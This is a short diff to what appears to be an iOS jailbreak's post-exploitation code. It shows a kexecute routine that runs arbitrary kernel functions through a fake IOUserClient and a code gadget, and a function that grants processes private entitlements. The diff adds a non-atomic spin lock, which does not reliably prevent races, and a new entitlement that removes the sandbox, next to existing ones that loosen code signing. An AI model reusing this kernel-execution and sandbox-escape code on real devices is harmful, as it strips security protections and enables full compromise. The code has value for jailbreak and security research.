@@ -233,7 +233,15 @@ kexecute(user_client, fake_client, rk64(rk64(dict)+SetObjectWithCharP), dict, s,
             }
 #define OSString_CStringPtr(str) rk64(str+0x10)
 
+bool kexecute_lock = false;
+
 uint64_t kexecute(mach_port_t user_client, uint64_t fake_client, uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
+    while (kexecute_lock == true){
+      NSLog(@"Kexecute locked. Waiting for 10ms.");
+      usleep(10000);
+    }
+    kexecute_lock = true;
+
     // When calling IOConnectTrapX, this makes a call to iokit_user_client_trap, which is the user->kernel call (MIG). This then calls IOUserClient::getTargetAndTrapForIndex
     // to get the trap struct (which contains an object and the function pointer itself). This function calls IOUserClient::getExternalTrapForIndex, which is expected to return a trap.
     // This jumps to our gadget, which returns +0x40 into our fake user_client, which we can modify. The function is then called on the object. But how C++ actually works is that the
@@ -251,6 +259,7 @@ uint64_t kexecute(mach_port_t user_client, uint64_t fake_client, uint64_t addr, 
     uint64_t returnval = IOConnectTrap6(user_client, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6));
     wk64(fake_client+0x40, offx20);
     wk64(fake_client+0x48, offx28);
+    kexecute_lock = false;
     return returnval;
 }
 
@@ -310,6 +319,7 @@ int setcsflagsandplatformize(int pd){
 
               OSDictionary_SetItem(amfi_entitlements, "get-task-allow", find_OSBoolean_True());
               OSDictionary_SetItem(amfi_entitlements, "com.apple.private.skip-library-validation", find_OSBoolean_True());
+              OSDictionary_SetItem(amfi_entitlements, "com.apple.private.security.no-sandbox", find_OSBoolean_True());
 
               NSLog(@"Set Entitlements on PID %d", pd);
 
